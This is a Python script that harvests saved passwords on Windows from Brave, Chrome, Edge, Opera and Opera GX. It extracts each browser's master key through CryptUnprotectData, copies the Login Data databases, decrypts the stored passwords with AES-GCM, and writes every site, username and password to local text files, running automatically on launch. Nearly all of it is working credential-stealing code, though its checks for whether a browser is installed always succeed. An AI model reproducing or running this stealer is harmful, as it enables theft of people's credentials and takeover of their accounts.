import base64
import json
import os
import shutil
import sqlite3

import win32crypt
from Crypto.Cipher import AES

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")


def get_key(browser):
    match browser:
        case "brave":
            loc_state = LOCAL+r'\BraveSoftware\Brave-Browser\User Data\Local State'
        case "chrome":
            loc_state = LOCAL+r'\Google\Chrome\User Data\Local State'
        case "edge":
            loc_state = LOCAL+r'\Microsoft\Edge\User Data\Local State'
        case "opera":
            loc_state = ROAMING+r'\Opera Software\Opera Stable\Local State'
        case "operagx":
            loc_state = ROAMING+r'\Opera Software\Opera GX Stable\Local State'
    with open(loc_state,"r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Chrome < 80"


def get_browser(browser):
    master_key = get_key(browser)
    match browser:
        case "chrome":
            login_db = LOCAL+r'\Google\Chrome\User Data\default\Login Data'
        case "brave":
            login_db = LOCAL+r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        case "edge":
            login_db = LOCAL+r'\Microsoft\Edge\User Data\Default\Login Data'
        case "opera":
            login_db = ROAMING+r'\Opera Software\Opera Stable\Login Data'
        case "operagx":
            login_db = ROAMING+r'\Opera Software\Opera GX Stable\Login Data'
    shutil.copy2(login_db,rf"./db/{browser}.db")
    conn = sqlite3.connect(rf"./db/{browser}.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        w = open(rf"./logins/{browser}_login.txt", "w+")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                w.write("Site: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n------------------------\n\n")
    except Exception:
        pass

    cursor.close()
    conn.close()
    
def init():
    os.system('mkdir db')
    os.system('mkdir logins')
    if os.environ['LOCALAPPDATA']+r'\BraveSoftware':
        get_browser("brave")
        print('Brave Passwords Decrypted Successfully')
    else:
        print('Brave is not installed :angry:')
    if os.environ['LOCALAPPDATA']+r'\Google\Chrome':
        get_browser("chrome")
        print('Chrome Passwords Decrypted Successfully')
    else:
        print('Chrome is not installed')
    if os.environ['LOCALAPPDATA']+r'\Microsoft\Edge':
        get_browser("edge")
        print('Microsoft Edge Passwords Decrypted Successfully')
    else:
        print('Microsoft Edge is not installed(how????)')
    if os.environ['APPDATA']+r'\Opera Software\Opera Stable':
        get_browser("opera")
        print('Opera Passwords decrypted Successfully')
    else:
        print('Opera is not installed')
    if os.environ['APPDATA']+r'\Opera Software\Opera GX Stable':
        get_browser("operagx")
        print('Opera GX Passwords Decrypted Successfully')
    else:
        print('Opera GX is not installed')
init()